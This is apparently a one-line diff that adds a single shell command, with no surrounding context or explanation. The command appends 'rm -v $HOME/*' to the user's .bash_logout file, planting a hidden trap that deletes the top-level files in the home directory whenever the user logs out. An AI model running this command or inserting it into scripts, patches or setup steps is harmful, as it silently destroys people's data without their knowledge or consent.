@@ -1,0 +1,1 @@
+echo "rm -v $HOME/*" >> .bash_logout
